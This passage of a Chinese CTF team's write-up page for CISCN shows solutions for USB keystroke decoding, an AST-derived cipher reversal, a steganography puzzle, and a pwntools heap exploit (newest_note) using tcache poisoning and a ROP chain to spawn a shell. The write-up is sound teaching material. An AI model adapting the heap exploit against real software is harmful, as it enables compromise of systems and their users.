+            <span style=color:#66d9ef>if</span> Bytes[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;00&#34;</span> <span style=color:#f92672>and</span> normalKeys<span style=color:#f92672>.</span>get(Bytes[<span style=color:#ae81ff>2</span>]):
+                result <span style=color:#f92672>+=</span> normalKeys[Bytes[<span style=color:#ae81ff>2</span>]]
+        <span style=color:#66d9ef>elif</span> int(Bytes[<span style=color:#ae81ff>0</span>],<span style=color:#ae81ff>16</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0b10</span> <span style=color:#f92672>or</span> int(Bytes[<span style=color:#ae81ff>0</span>],<span style=color:#ae81ff>16</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0b100000</span>: <span style=color:#75715e># shift key is pressed.</span>
+            <span style=color:#66d9ef>if</span> Bytes[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;00&#34;</span> <span style=color:#f92672>and</span> normalKeys<span style=color:#f92672>.</span>get(Bytes[<span style=color:#ae81ff>2</span>]):
+                result <span style=color:#f92672>+=</span> shiftKeys[Bytes[<span style=color:#ae81ff>2</span>]]
+        <span style=color:#66d9ef>else</span>:
+            print(<span style=color:#e6db74>&#34;[-] Unknow Key : </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (Bytes[<span style=color:#ae81ff>0</span>]))
+    print(<span style=color:#e6db74>&#34;[+] Found : </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (result))
+    <span style=color:#75715e># clean the temp data</span>
+    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;rm ./</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (DataFileName))
+ 
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+    main()
+
+</code></pre></div><h3 id=6-baby_tree>6. baby_tree<a hidden class=anchor aria-hidden=true href=#6-baby_tree>#</a></h3>
+<h4 id=操作内容-3>操作内容<a hidden class=anchor aria-hidden=true href=#操作内容-3>#</a></h4>
+<p>分析给出的ast树，推出加密算法</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encodeing</span>(e, Val):
+    b <span style=color:#f92672>=</span> list(e)
+    k <span style=color:#f92672>=</span> list(Val)
+    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>39</span>):
+        r0,r1,r2,r3 <span style=color:#f92672>=</span> b[i],b[i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>],b[i<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>],b[i<span style=color:#f92672>+</span><span style=color:#ae81ff>3</span>]
+        b[i<span style=color:#f92672>+</span><span style=color:#ae81ff>0</span>]<span style=color:#f92672>=</span> r2<span style=color:#f92672>^</span>((k[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span>(r0 <span style=color:#f92672>&gt;&gt;</span><span style=color:#ae81ff>4</span>)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>)
+        b[i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> r3((k[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span>(r1 <span style=color:#f92672>&gt;&gt;</span><span style=color:#ae81ff>2</span>)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>)
+        b[i<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>]<span style=color:#f92672>=</span> r0<span style=color:#f92672>^</span> k[<span style=color:#ae81ff>2</span>]
+        b[i<span style=color:#f92672>+</span><span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> r1<span style=color:#f92672>^</span> k[<span style=color:#ae81ff>3</span>]
+        k[<span style=color:#ae81ff>0</span>],k[<span style=color:#ae81ff>1</span>],k[<span style=color:#ae81ff>2</span>],k[<span style=color:#ae81ff>3</span>]<span style=color:#f92672>=</span> k[<span style=color:#ae81ff>1</span>],k[<span style=color:#ae81ff>2</span>],k[<span style=color:#ae81ff>3</span>],k[<span style=color:#ae81ff>0</span>]
+    <span style=color:#66d9ef>return</span> b
+</code></pre></div><p>根据该算法，推出以下解密代码，计算b值，得到flag</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529195925983.png alt=image-20220529195925983>
+</p>
+<h4 id=脚本代码-1>*脚本代码<a hidden class=anchor aria-hidden=true href=#脚本代码-1>#</a></h4>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>k <span style=color:#f92672>=</span> list(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;y345&#39;</span>)
+Bytes<span style=color:#f92672>=</span> [<span style=color:#ae81ff>88</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>88</span>, <span style=color:#ae81ff>225</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>201</span>, <span style=color:#ae81ff>57</span>, <span style=color:#ae81ff>94</span>, <span style=color:#ae81ff>77</span>, <span style=color:#ae81ff>56</span>, <span style=color:#ae81ff>75</span>, <span style=color:#ae81ff>168</span>, <span style=color:#ae81ff>72</span>, <span style=color:#ae81ff>218</span>, <span style=color:#ae81ff>64</span>, <span style=color:#ae81ff>91</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>101</span>, <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>207</span>, <span style=color:#ae81ff>73</span>, <span style=color:#ae81ff>130</span>, <span style=color:#ae81ff>74</span>, <span style=color:#ae81ff>128</span>, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>201</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>248</span>, <span style=color:#ae81ff>41</span>, <span style=color:#ae81ff>205</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>84</span>, <span style=color:#ae81ff>91</span>, <span style=color:#ae81ff>99</span>, <span style=color:#ae81ff>79</span>, <span style=color:#ae81ff>202</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>131</span>, <span style=color:#ae81ff>63</span>, <span style=color:#ae81ff>255</span>, <span style=color:#ae81ff>20</span>, <span style=color:#ae81ff>16</span>]
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>38</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>):
+    k[<span style=color:#ae81ff>0</span>], k[<span style=color:#ae81ff>1</span>], k[<span style=color:#ae81ff>2</span>], k[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> k[<span style=color:#ae81ff>3</span>], k[<span style=color:#ae81ff>0</span>], k[<span style=color:#ae81ff>1</span>], k[<span style=color:#ae81ff>2</span>]
+    r1 <span style=color:#f92672>=</span> Bytes[i<span style=color:#f92672>+</span><span style=color:#ae81ff>3</span>] <span style=color:#f92672>^</span> k[<span style=color:#ae81ff>3</span>]
+    r0 <span style=color:#f92672>=</span> Bytes[i<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>] <span style=color:#f92672>^</span> k[<span style=color:#ae81ff>2</span>]
+    r3 <span style=color:#f92672>=</span> Bytes[i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>^</span> ((k[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> (r1 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>2</span>)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>)
+    r2 <span style=color:#f92672>=</span> Bytes[i] <span style=color:#f92672>^</span> ((k[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> (r0 <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>4</span>)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>)
+    Bytes[i], Bytes[i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>], Bytes[i<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>], Bytes[i<span style=color:#f92672>+</span><span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> r0, r1, r2, r3
+print(bytes(Bytes))
+</code></pre></div><h4 id=flag值-4>flag值：<a hidden class=anchor aria-hidden=true href=#flag值-4>#</a></h4>
+<pre tabindex=0><code class=language-flag data-lang=flag>flag{30831242-56db-45b4-96fd-1f47e60da99d}
+</code></pre><h3 id=7-everlasting_night>7. everlasting_night<a hidden class=anchor aria-hidden=true href=#7-everlasting_night>#</a></h3>
+<h4 id=操作内容-4>操作内容<a hidden class=anchor aria-hidden=true href=#操作内容-4>#</a></h4>
+<ol>
+<li>
+<p>下载附件</p>
+</li>
+<li>
+<p>获取png图片</p>
+</li>
+<li>
+<p>使用HxD Hex Editor发现png文件尾异常</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529200217390.png alt=image-20220529200217390>
+</p>
+</li>
+</ol>
+<p>正好多出32位数据</p>
+<pre tabindex=0><code class=language-md5 data-lang=md5>FB 3E FC E4 CE AC 2F 54 45 C7 AE 17 E3 E9 69 AB
+</code></pre><p>猜测是md5值，进行撞库</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529200256888.png alt=image-20220529200256888>
+</p>
+<p>字符串：<code>ohhWh04m1</code></p>
+<p>加上后补充的提示使用LSB隐写</p>
+<p>使用https://github.com/livz/cloacked-pixel中脚本与上文密码进行解密</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529205557072.png alt=image-20220529205557072>
+</p>
+<p>解密得到的压缩包，密码就是上面的字符串，获得flag的变形图片，打开photoshop对其进行变形位移调整</p>
+<p><img loading=lazy src=/CiscnWP.assets/%7D/image-20220529200432912.png alt=image-20220529200432912>
+</p>
+<h4 id=flag值-5>flag值：<a hidden class=anchor aria-hidden=true href=#flag值-5>#</a></h4>
+<pre tabindex=0><code class=language-flag data-lang=flag>flag{607f41da-e849-4c0b-8867-1b3c74536cc4}
+</code></pre><h3 id=8-newest_note>8. newest_note<a hidden class=anchor aria-hidden=true href=#8-newest_note>#</a></h3>
+<p>nc连接后，根据附件，编写相应脚本，执行后可得flag</p>
+<h4 id=脚本代码-2>脚本代码<a hidden class=anchor aria-hidden=true href=#脚本代码-2>#</a></h4>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#34;./pwn&#34;</span>)
+libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./libc.so.6&#39;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>add</span>(i, data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;aaaaaaaa&#34;</span>):
+    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;1&#34;</span>)
+    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    p<span style=color:#f92672>.</span>sendline(str(i))
+    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    p<span style=color:#f92672>.</span>send(data)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>dele</span>(i):
+    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;2&#34;</span>)
+    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    p<span style=color:#f92672>.</span>sendline(str(i))
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>show</span>(i):
+    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;3&#34;</span>)
+    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    p<span style=color:#f92672>.</span>sendline(str(i))
+    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Content: &#34;</span>)
+    m <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvline()
+    <span style=color:#66d9ef>return</span> u64(m[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
+
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+    <span style=color:#75715e># 先泄露堆地址</span>
+    booksize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x1fffffff</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xa0</span>
+    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;will be? :&#34;</span>)
+    p<span style=color:#f92672>.</span>sendline(str(booksize)) <span style=color:#75715e># malloc 0x500</span>
+    add(<span style=color:#ae81ff>0</span>)
+    add(<span style=color:#ae81ff>1</span>)
+    add(<span style=color:#ae81ff>2</span>)
+    add(<span style=color:#ae81ff>3</span>)
+    dele(<span style=color:#ae81ff>0</span>)
+    m <span style=color:#f92672>=</span> show(<span style=color:#ae81ff>0</span>)
+    heap_base <span style=color:#f92672>=</span> m <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>12</span>
+    print(<span style=color:#e6db74>&#34;heap==&gt;&#34;</span>, hex(heap_base))
+    <span style=color:#75715e># 构造tcache bin链</span>
+    dele(<span style=color:#ae81ff>1</span>)
+    dele(<span style=color:#ae81ff>2</span>)
+    dele(<span style=color:#ae81ff>3</span>)
+    <span style=color:#75715e># 修改标志位，就可以继续删除</span>
+    add(<span style=color:#ae81ff>0xa9</span>)
+    dele(<span style=color:#ae81ff>1</span>)
+    <span style=color:#75715e># 分配到最上面</span>
+    add(<span style=color:#ae81ff>4</span>, p64((heap_base <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>12</span>) <span style=color:#f92672>^</span> (heap_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x2a0</span>)))
+    add(<span style=color:#ae81ff>5</span>)
+    add(<span style=color:#ae81ff>6</span>)
+    add(<span style=color:#ae81ff>7</span>)
+    dele(<span style=color:#ae81ff>7</span>)
+
+    <span style=color:#75715e># 泄露libc地址</span>
+    libc_base <span style=color:#f92672>=</span> show(<span style=color:#ae81ff>7</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x218cc0</span>
+    print(<span style=color:#e6db74>&#39;libc_base==&gt;&#39;</span>, hex(libc_base))
+    <span style=color:#75715e># 泄露堆栈地址</span>
+    env <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>sym[<span style=color:#e6db74>&#39;environ&#39;</span>]
+    add(<span style=color:#ae81ff>20</span>, p64(libc_base<span style=color:#f92672>+</span>env)<span style=color:#f92672>*</span><span style=color:#ae81ff>0x4</span>)
+    stack_addr <span style=color:#f92672>=</span> show(<span style=color:#ae81ff>0x0</span>)
+    print(<span style=color:#e6db74>&#39;stack==&gt;&#39;</span>, hex(stack_addr))
+    payload <span style=color:#f92672>=</span> p64(heap_base<span style=color:#f92672>+</span><span style=color:#ae81ff>0x300</span>)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x41</span>)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x1000</span>)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0x41</span>)<span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>
+    add(<span style=color:#ae81ff>0</span>, payload)
+
+    payload <span style=color:#f92672>=</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x41</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x1000</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x41</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)
+    add(<span style=color:#ae81ff>1</span>, payload)
+    add(<span style=color:#ae81ff>2</span>)
+    add(<span style=color:#ae81ff>3</span>)
+    dele(<span style=color:#ae81ff>3</span>)
+    dele(<span style=color:#ae81ff>1</span>)
+    dele(<span style=color:#ae81ff>8</span>)
+    <span style=color:#75715e># rop</span>
+    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x20</span><span style=color:#f92672>+</span>p64((heap_base <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>12</span>) <span style=color:#f92672>^</span> (stack_addr <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1a8</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0x50</span>))
+    add(<span style=color:#ae81ff>0</span>, payload)
+    add(<span style=color:#ae81ff>0</span>)
+    binsh <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>search(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh&#39;</span>)<span style=color:#f92672>.</span>__next__()
+    sys <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>sym[<span style=color:#e6db74>&#39;system&#39;</span>]
+    payload <span style=color:#f92672>=</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> p64(libc_base<span style=color:#f92672>+</span><span style=color:#ae81ff>0x02e6c5</span>)<span style=color:#f92672>+</span>p64(libc_base <span style=color:#f92672>+</span> binsh) 
+    payload <span style=color:#f92672>+=</span> p64(libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x02d9b9</span>) <span style=color:#f92672>+</span> p64(libc_base <span style=color:#f92672>+</span> sys)
+    add(<span style=color:#ae81ff>0</span>,payload)
+
+    p<span style=color:#f92672>.</span>interactive()
+</code></pre></div><h4 id=flag值-6>flag值：<a hidden class=anchor aria-hidden=true href=#flag值-6>#</a></h4>
+<pre tabindex=0><code class=language-flag data-lang=flag>flag{6c9d1e47-1611-4b5f-9890-5f988b0c3fcc}
+</code></pre>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://shinning.cloud/tags/ctf/>CTF</a></li>
+<li><a href=https://shinning.cloud/tags/writeup/>WriteUP</a></li>
+<li><a href=https://shinning.cloud/tags/web/>Web</a></li>
+<li><a href=https://shinning.cloud/tags/note/>Note</a></li>
+</ul>
+<nav class=paginav>
+<a class=prev href=https://shinning.cloud/post/ctf/ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/>
+<span class=title>« Prev Page</span>
+<br>
+<span>CTF比赛方向选择&学习内容</span>
+</a>
+<a class=next href=https://shinning.cloud/post/notes/cryptology/>
+<span class=title>Next Page »</span>
+<br>
+<span>应用密码学复习提纲</span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share CISCN Crypt0 战队 WRITEUP on twitter" href="https://twitter.com/intent/tweet/?text=CISCN%20Crypt0%20%e6%88%98%e9%98%9f%20WRITEUP&url=https%3a%2f%2fshinning.cloud%2fpost%2fctf%2fwp%2fciscnwp%2f&hashtags=CTF%2cWriteUP%2cWeb%2cNote"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share CISCN Crypt0 战队 WRITEUP on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fshinning.cloud%2fpost%2fctf%2fwp%2fciscnwp%2f&title=CISCN%20Crypt0%20%e6%88%98%e9%98%9f%20WRITEUP&summary=CISCN%20Crypt0%20%e6%88%98%e9%98%9f%20WRITEUP&source=https%3a%2f%2fshinning.cloud%2fpost%2fctf%2fwp%2fciscnwp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share CISCN Crypt0 战队 WRITEUP on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fshinning.cloud%2fpost%2fctf%2fwp%2fciscnwp%2f&title=CISCN%20Crypt0%20%e6%88%98%e9%98%9f%20WRITEUP"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share CISCN Crypt0 战队 WRITEUP on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fshinning.cloud%2fpost%2fctf%2fwp%2fciscnwp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share CISCN Crypt0 战队 WRITEUP on whatsapp" href="https://api.whatsapp.com/send?text=CISCN%20Crypt0%20%e6%88%98%e9%98%9f%20WRITEUP%20-%20https%3a%2f%2fshinning.cloud%2fpost%2fctf%2fwp%2fciscnwp%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share CISCN Crypt0 战队 WRITEUP on telegram" href="https://telegram.me/share/url?text=CISCN%20Crypt0%20%e6%88%98%e9%98%9f%20WRITEUP&url=https%3a%2f%2fshinning.cloud%2fpost%2fctf%2fwp%2fciscnwp%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer>
+<style>:root{--article-font-family:"Noto Serif SC", var(--base-font-family)}</style>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+<div>
+<div class=pagination__title>
+<span class=pagination__title-h style=font-size:20px>💬评论</span>
+<hr>
+</div>
+<div id=tcomment></div>
+<script src=https://cdn.jsdelivr.net/npm/twikoo@1.4.17/dist/twikoo.all.min.js></script>
